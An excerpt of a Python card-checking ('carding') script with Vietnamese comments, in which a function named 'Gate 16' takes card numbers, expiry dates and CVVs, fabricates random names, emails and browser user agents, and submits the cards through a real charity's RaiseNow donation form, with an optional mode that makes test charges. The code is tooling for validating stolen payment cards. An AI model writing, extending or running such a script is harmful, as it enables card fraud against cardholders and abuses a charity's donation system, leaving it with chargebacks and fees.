...
def random_email():
    """Tạo một địa chỉ email ngẫu nhiên theo yêu cầu mới."""
...
# --- LOGIC CHÍNH CỦA GATE 16 ---

def check_card_gate16(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate16_mode, get_charge_value_func, custom_charge_amount=None):
    """
    Logic for Gate 16 - Dựa trên formId và payload bạn cung cấp.
    """
    gate16_mode = get_gate16_mode()
    
    try:
        # --- Tạo dữ liệu ngẫu nhiên với yêu cầu mới ---
        user_agent = random_user_agent()
        # Yêu cầu mới: random tên từ 15 đến 30 chữ
        ...
        # Yêu cầu mới: random email 20-30 chữ + 2 số
        email = random_email()
        ...
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250809151742149087", # formId bạn cung cấp
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
        ...
        # Payload cơ bản từ thông tin bạn cung cấp, thay thế các giá trị bằng placeholder
        base_payload = {
            "account_uuid": "a1762b84-a8ed-4a78-a15b-f9b1a5ee54f6",
            "test_mode": False,
            ...
            "raisenow_parameters": {
                "analytics": {
                    ...
                    "suggested_amounts": "[5000,7500,15000]",
                    "user_agent": user_agent # Thay thế
                },
                "solution": {
                    "uuid": "6089e361-f488-498d-9fb1-a4ace4560b5d",
                    "name": "Campagne Sindomestico",
                    "type": "donate"
                },
                "product": {
                    "name": "tamaro",
                    "source_url": "https://donate.raisenow.io/yjkhv?lng=fr",
                    "uuid": "self-service",
                    "version": "2.16.0"
                },
                "integration": {
            ...
            "custom_parameters": {
                "campaign_id": "Campagne Sindomestico",
                "campaign_subid": "E-CH/Sindomestico"
            },
            "payment_information": {
                "brand_code": "eca",
            ...
            "profile": "170e5c26-9289-4d1f-abc2-ae83d1a66b5a",
            "return_url": "https://donate.raisenow.io/yjkhv?lng=fr&rnw-view=payment_result"
        }

        # --- CHẾ ĐỘ CHARGE ---
        if gate16_mode == 'charge':
            charge_value = get_charge_value_func('16', custom_charge_amount)
        ...
        logger.error(f"Unknown error in Gate 16 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 16 System Error: {e}", bin_info
